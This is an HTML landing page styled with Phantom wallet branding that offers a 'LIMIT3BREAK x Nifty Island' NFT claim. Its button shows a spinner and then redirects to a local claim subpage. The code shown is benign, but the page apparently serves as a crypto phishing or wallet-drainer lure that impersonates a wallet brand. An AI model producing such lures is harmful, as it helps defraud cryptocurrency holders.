<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Claim NFT - Phantom Wallet Theme</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    body {
      background: linear-gradient(135deg, #819db4, #040c1b00);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 600px;
      margin: 80px auto;
      text-align: center;
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .phantom-logo {
      width: 120px;
      margin-bottom: 20px;
    }

    .phantom-image {
      width: 100%;
      border-radius: 15px;
      margin-top: 20px;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.3);
    }

    h1 {
      font-size: 2.2em;
      margin-bottom: 20px;
    }

    button {
      background-color: #181d24;
      border: none;
      padding: 15px 30px;
      color: white;
      font-size: 18px;
      margin-top: 25px;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #732d91;
    }
    #loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(255, 255, 255, 0.9);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.spinner {
  border: 6px solid #ccc;
  border-top: 6px solid #333;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

  </style>
</head> 
<body>
   
  <div id="loading-overlay">
  <div class="spinner"></div>
</div>


  <div class="container">
    <img src="https://cryptologos.cc/logos/phantom-phantom-logo.png" alt="Phantom Logo" class="phantom-logo">
    <h1>LIMIT3BREAK x Nifty Island</h1>
    <img src="./Screenshot 2025-05-22 203144.png" alt="Phantom Image" class="phantom-image">
    <button id="claimBtn">Claim NFT</button>
  </div>

  <script>
  window.addEventListener("DOMContentLoaded", () => {
    const overlay = document.getElementById("loading-overlay");
    overlay.style.display = "none"; // Hide loader after page loads

    const button = document.getElementById("claimBtn");
    if (button) {
      button.addEventListener("click", function(e) {
        e.preventDefault(); // Prevent instant jump
        overlay.style.display = "flex"; // Show loading spinner

        // Small delay to allow the spinner to be visible
        setTimeout(() => {
          window.location.href = "./claim/index.html";
        }, 1500);
      });
    }
  });
</script>

</body>
</html>
